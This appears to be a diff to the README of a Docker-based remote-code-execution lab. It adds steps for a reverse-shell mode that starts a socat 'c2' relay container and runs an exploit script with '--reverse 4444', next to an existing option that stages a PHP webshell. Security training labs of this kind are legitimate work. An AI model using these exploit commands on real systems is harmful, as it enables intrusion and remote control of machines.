@@ -55,6 +55,12 @@ docker compose -f lab/rce/docker-compose.yml exec apache cat /tmp/proof
 # interactive console as the worker user (stages a PHP webshell served from
 # inside the target; works even on rootless Docker with no callback path)
 python3 exploit/rce.py --shell
+
+# CLASSIC reverse shell, two-box style: the victim connects OUT to a socat
+# c2 relay on the lab network; you land in the victim's sh via docker attach
+# (works on every Docker flavor — container-to-container needs no host path)
+docker compose -f lab/rce/docker-compose.yml up -d c2
+python3 exploit/rce.py --reverse 4444
 ```
 
 Everything PHP-side runs inside Docker; the host only needs Python 3
